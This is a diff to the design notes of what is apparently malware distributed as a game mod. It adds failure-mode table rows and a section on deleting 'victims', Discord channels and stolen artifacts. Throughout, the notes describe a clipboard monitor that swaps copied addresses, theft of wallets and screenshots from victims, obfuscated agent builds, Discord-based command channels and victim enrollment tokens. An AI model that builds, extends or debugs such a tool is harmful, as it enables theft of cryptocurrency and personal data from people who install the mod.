@@ -30,13 +30,24 @@ Ordered by likelihood. Every entry is contained by design unless stated.
 | 24 | `agent.bin` stale | build | mod ships old agent | `processResources` depends on `copyAgent`; clean build after `agent` changes |
 | 25 | ProGuard strips JSON fields | obfuscated build | empty config | Keep `com.serverpackcore.agent.**` and no field renaming (`Json` uses string keys, not reflection) |
 | 26 | `Screenshot` headless | lock screen | black PNG | Retried on the next task; `screenshot` is not part of bootstrap |
+| 26b | `Screen Capture in the selected area was not allowed` | Linux without a display/lock screen | `screenshot` ends as `error` | Expected in headless sessions; it is not retried in a loop. Retry once an X/Wayland session is active |
 | 27 | Clipboard reverts | Windows clipboard manager | replacement lost | The monitor re-applies only when the user copies the original address again; history keeps both |
 | 28 | Memory spike on 512 MiB artifact | low-RAM victim | OOM risk | Container built on disk, deflate streamed per file; per-file reads capped by profile |
 | 29 | `crypto` disabled | jar without `config.json` | no panel transport | Discord path stays fully functional; `crypto` command says so |
 | 30 | Duplicate enrollment | cloned disk | two rows | Unique `(build_id, hostname, username)`; token rotated, old token stops working |
+
+## Delete and channel lifecycle
+
+- Deleting a victim cascades tasks, artifacts, wallets, logs and the Discord link,
+  and writes `DiscordIgnore` for the channel. The sweep does not resurrect it.
+- Deleting a Discord channel in Discord leaves the link `missingAt`; recreate the
+  same channel name or delete the victim and re-link.
+- Deleting an artifact removes the extracted directory, the container file, its
+  wallets and screenshots, and writes an audit row.
 
 ## Deliberately not retried
 
 - Bad build token (`unknown_build`): needs a new jar.
 - Revoked build/victim (`403`/`410`): agent stops and preserves local data.
 - `unknown_task`: result is reported and the queue moves on.
+- Headless `screenshot` denial: reported once as an error, never in a loop.
